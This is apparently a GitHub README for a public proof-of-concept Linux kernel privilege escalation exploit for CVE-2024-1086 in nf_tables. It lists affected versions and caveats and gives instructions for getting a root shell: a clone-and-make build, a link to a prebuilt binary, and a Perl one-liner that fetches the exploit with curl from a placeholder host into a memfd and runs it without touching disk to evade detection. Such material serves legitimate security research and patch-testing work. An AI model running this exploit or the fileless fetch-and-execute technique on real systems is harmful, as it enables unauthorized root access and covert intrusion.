# CVE-2024-1086

Universal local privilege escalation Proof-of-Concept exploit for [CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086), working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.

https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de

## Blogpost / Write-up

A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the [Flipping Pages blogpost](https://pwning.tech/nftables/).


## Affected versions

The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149>, v6.1.76>, v6.6.15>. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.

**Caveats:**
- The exploit does not work on v6.4> kernels with kconfig `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` (including Ubuntu v6.5)
- The exploits requires user namespaces (kconfig `CONFIG_USER_NS=y`), that those user namespaces are unprivileged (sh command `sysctl kernel.unprivileged_userns_clone` = 1), and that nf_tables is enabled (kconfig `CONFIG_NF_TABLES=y`). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well. Additionally, the exploit has only been tested on x64/amd64.
- The exploit may be *very* unstable on systems with a lot of network activity
	- Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable. 
	- On test devices, please turn off WiFi adapters through BIOS.
- The kernel panic (system crash) after running the exploit is a side-effect which deliberately hasn't been fixed to prevent malicious usage of the exploit (i.e. exploitation attempts should now be more noticable, and unpractical in real-world operations). Despite this, it still allows for a working proof-of-concept in lab environments, as the root shell is functional, and persistence through disk is possible.

## Usage

### Configuration

The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in [`src/config.h`](/src/config.h). If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase `CONFIG_PHYS_MEM`.
If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle `CONFIG_REDIRECT_LOG` to `1` to avoid unnecessary network activity.

### Building

If this is impractical for you, there is an [compiled x64 binary](https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit) with the default config.

```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

Binary: `CVE-2024-1086/exploit`


### Running

Running the exploit is just as trivial:

```bash
./exploit
```

Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:
```bash
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  system "curl https://example.com/exploit -s >&$fd";
  exec {"/proc/$$/fd/$fd"} "memfd";
'
```

## Disclaimer

The programs and scripts ("programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.
